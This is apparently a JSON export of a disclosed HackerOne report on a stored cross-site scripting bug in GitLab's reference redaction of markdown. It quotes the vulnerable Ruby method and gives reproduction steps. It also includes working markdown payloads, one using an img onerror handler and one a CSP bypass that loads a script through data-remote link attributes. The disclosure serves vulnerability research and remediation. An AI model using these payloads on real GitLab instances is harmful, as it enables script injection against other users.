{
  "id": 836649,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzY2NDk=",
  "url": "https://hackerone.com/reports/836649",
  "title": "Stored XSS in markdown when redacting references",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2020-04-01T22:46:10.314Z",
  "submitted_at": "2020-04-01T22:46:10.314Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T090647Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a1191f740950a8f654e3d58837b4345f0b3123fbcad806d7e9dd982897ec121"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-09-09T21:58:37.456Z",
  "bug_reporter_agreed_on_going_public_at": "2020-09-08T23:06:50.989Z",
  "team_member_agreed_on_going_public_at": "2020-09-09T21:58:37.354Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nIt's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the `data-original` attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:\n\n```ruby\n    def redacted_node_content(node)\n      original_content = node.attr('data-original')\n      link_reference = node.attr('data-link-reference')\n\n      # Build the raw <a> tag just with a link as href and content if\n      # it's originally a link pattern. We shouldn't return a plain text href.\n      original_link =\n        if link_reference == 'true'\n          href = node.attr('href')\n          content = original_content\n\n          %(<a href=\"#{href}\">#{content}</a>)\n        end\n\n      # The reference should be replaced by the original link's content,\n      # which is not always the same as the rendered one.\n      original_link || original_content || node.inner_html\n    end\n```\n\n### Steps to reproduce\n1. create a private project with one account\n1. create an issue in the private project\n1. sign into another account that does not have permission to read the above project\n1. comment on an issue linking to the private issue using the following:\n\n    ```markdown\nlink: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\" title=\"title\">xss &lt;img onerror=alert(1) src=x></a>\n    ```\n1. The rendered markdown contains the injected html:\n\n    ```html\n<div class=\"md\"><p data-sourcepos=\"1:1-1:124\" dir=\"auto\">link: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\">xss <img onerror=\"alert(1)\" src=\"x\"></a></p></div>\n    ```\n\nThe above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):\n\n```markdown\nlink: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\" title=\"title\">csp \n&lt;a \n  data-remote=&quot;true&quot;\n  data-method=&quot;get&quot;\n  data-type=&quot;script&quot;\n  href=/wbowling/wiki/raw/master/test.js\n  class='atwho-view select2-drop-mask pika-select'\n&gt;\n  &lt;img height=10000 width=10000&gt;\n&lt;/a&gt;\n</a>\n```\n\nwhich generates the following html:\n```html\n<div class=\"md issue-realtime-trigger-pulse\"><p data-sourcepos=\"1:1-11:4\" dir=\"auto\">link: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\">csp\n</a><a data-remote=\"true\" data-method=\"get\" data-type=\"script\" href=\"/wbowling/wiki/raw/master/test.js\" class=\"atwho-view select2-drop-mask pika-select\">\n<img height=\"10000\" width=\"10000\">\n</a>\n</p></div>\n```\n\n### Impact\nAnywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss\n\n### Examples\n* example payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1\n* with csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2\n\n### What is the current *bug* behavior?\nThe `data-original` attribute can be abused to inject arbitrary html when a reference is redacted.\n\n### What is the expected *correct* behavior?\nThe `data-original` should be double encoded or filtered before being reused.\n\n### Relevant logs and/or screenshots\n{F769570}\n\n### Output of checks\nHappens on gitlab.com\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:\t\tUbuntu 18.04\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.5p114\nGem Version:\t2.7.10\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t5.0.7\nGit Version:\t2.24.1\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.9.2-ee\nRevision:\t0ad76f4d374\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.12\nURL:\t\thttp://gitlab-vm.local\nHTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers:\n\nGitLab Shell\nVersion:\t12.0.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\nAnywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss",
  "bounty_amount": "5000.0",
  "formatted_bounty": "$5,000",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 769570,
      "file_name": "Screen_Shot_2020-04-02_at_9.44.33_am.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sJwpJkAHWSodEXRt6MuxXyYw?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_9.44.33_am.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_9.44.33_am.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXSC2BV6P%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T090647Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDBIYb02bdmQriBWFQCEt2NO%2BhKeraB1Qpp81%2FB0i9PpAIgHE%2BQf3yAo0CZ%2FZ3u4XKtRCYh4rXLiTb1MJbcg0gdWxAqsgUIEBADGgwwMTM2MTkyNzQ4NDkiDCXH8kDWzUxqHWFGdSqPBTU8%2FsCyCfLOsQWZ0n8Vwyc49u2ZrgqAwWPscpryNaiw1d89b1p6tHxiVdX6ZHTu55X%2FmXPMu3l2kl9iEv3sv6fR5NB3AS2601G1Aufr23nWvSUWxu193vVfMoRmlrE%2BwNiG%2FX5RQWLr8xCt43VvqxD1VwBJ1%2FRn3f7YRpNEyFPcpVD%2FZSbzgRJ7ycQykB9d3KUkHYh%2FgnnBxcIyBMa2WQuglu%2BPQdV3k%2FWawLxCd1jZqacsxjIsp%2FgVzSoYMdLXDtKdM3ANmASZNZjoaaX4r5M%2BpkUvnhhqFy%2FDPBxmmKDto9anAWsN781BmRlDy5RZO9eZNMWGIYRVcvSk75POfwWIHN0RXGfWg31SHJyzDAZSZOM3Kagl3mkYvmR1mlxl%2F7Wxdxkr9gMjbvH%2FvUmYIl%2FMuIe9UTIVtEXJof3GHP8ozEi4QYwBwGxBI%2F9UeeUT7KthQIbNkpzeImvDRLpkiJTvIku0EClCKE3HomU65erQsoEPwp0Z%2B1KDSdn2y6%2F8B3f12AmMNytEdVTsfpYsJwHpa5ldrCOtv56n6YyUIOMlSmauNd3YAXISEUDWEAvR%2BitCjK02JztBXQAx6E%2FVSAOEfGRUhUUvTfG4MNJfiZFtS3EkZMHtNXOPxH%2BKHwRZLJBIemfk3GNle%2B6ve8CA0v%2BmBSZufZn0bhOSZJSj8JEFXx%2BSVrX9sLN6LL1zsxTwhsCgIBz1t1VTb5%2FYmnsFKEonTNk2L6nSGyKh0E6OxW0Gpv6LXQI%2BbOulfsaMevlpPCK0x3UzZZVhkt9uKAc6sSTYU3ZYxCaT96B1x8AU9cVFetiUS%2FS%2BpJ7KFcDdmg7NxmmR82rqk%2F95Q11hkdNrcvflKU1naXYYR3RaGVQOPn4wsLi%2BxgY6sQHcA8FyNn5BdDkdxWC6Pvkk0Ms0ZxKd%2BmExljJyCpvOJX4hl7PqcQMC6ZWa7lwCx7N3rC19UTcW8KZ7tiezB5sRqVb7a4ttSTZVJLtpt2HKYTnln5CyIMIQ%2BDW6W84g2neFcrtV5IAZBqjMUCtNRur2Gxi9ge8uKY4ZZBVtf47zz%2Fjw55UfZHZofZPDiKeq8Af8oShnRDlX93IqEBMsD5epUFmbTEBefGgEfdSr%2FXAJKio%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=311a378c48d8a31eebee1f5b71e613dc1817de5b2cf50761a4b8db8fefccbb10",
      "file_size": 772935,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 49,
  "voters": [
    "int0x13",
    "sky003",
    "th3hidd3nmist",
    "ivarsvids",
    "4m1th",
    "n1m0",
    "p1stachios",
    "m0chan",
    "wh0ru",
    "holyfield",
    "and 39 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
